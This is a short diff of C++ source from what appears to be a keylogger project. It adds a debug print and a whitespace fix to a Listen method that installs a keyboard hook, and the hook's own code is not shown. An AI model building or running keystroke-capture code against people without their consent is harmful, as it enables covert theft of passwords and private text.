@@ -8,9 +8,10 @@ Keylogger::Keylogger(std::ofstream&& outputFile, OSManager& manager, WindowInfo&
     : _outputFile (std::move(outputFile)), _manager(manager), _windowInfo(windowInfo), _keyInput(keyInput) {}
 
 void Keylogger::Listen() {
+    std::cout << "entrou";
     this->_manager.SetTerminalVisibility(true);
     HookManager::InstallKeyboardHook(this);
-    
+
     keepRunning();
 }
 
